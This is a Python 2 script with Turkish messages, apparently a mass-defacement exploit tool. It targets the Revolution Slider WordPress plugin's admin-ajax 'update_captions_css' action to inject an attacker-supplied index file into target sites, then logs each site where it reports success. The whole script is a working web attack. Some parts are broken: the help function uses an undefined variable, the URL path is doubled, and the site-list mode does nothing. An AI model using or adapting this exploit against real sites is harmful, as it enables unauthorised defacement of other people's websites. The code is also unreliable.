#!/usr/bin/env python2
#-*- coding:utf-8
import argparse
import os
import requests
def yardim():
    
    yazdir += "--yardim , -y Yardım Menüsü\n"
    yazdir +=  "--site , -s Hedef site\n"
    yazdir += "--sitelistesi , -sl Hedef site listesi\n"
    yazdir += "--index , -i İndex dosyası"
    yazdir += "--kayit , -k Kayıt edilicek dosya adı"
    print yazdir
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--yardim","-y",action='store_true')
parser.add_argument("--site","-s")
parser.add_argument("--sitelistesi","-sl")
parser.add_argument("--index","-i")
parser.add_argument("--kayit","-k")
args = parser.parse_args()
def exploit():
    ajax = "/wp-admin/admin-ajax.php"
    link = "/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
    if(args.index):
        pass
    else:
        print "İndex listesi girilmemiş."
        exit()
    if args.site:
        if('http://' in args.site):
            pass
        elif('https://' in args.site):
            pass
        else:
            print "Sitenin başına http:// veya https:// giriniz."
            exit()
        url = args.site + ajax + link
        dosya = open(args.index,'r').readlines()

        exp = {'action':'revslider_ajax_action'
        ,
        'client_action':'update_captions_css'
        ,'data':dosya}
        kp = {'Connection':'keep-alive'}
        try:
            req = requests
            kod = req.post(url,data=exp,timeout=10,headers=kp)
            if kod.status_code == 200:
                if args.kayit:
                    dosya = open(args.kayit,"w+")
                    dosya.writelines(url+os.linesep)
                    dosya.close()
                print "[Exploit Başarılı]"+url
        except requests.exceptions.ConnectionError:
                pass
        except requests.exceptions.ReadTimeout:
                pass
    elif args.sitelistesi:
        pass
    else:
        print "Hedef site veya site listesi girilmemiş."
        exit()
if args.yardim:
    yardim()

else:
    exploit()
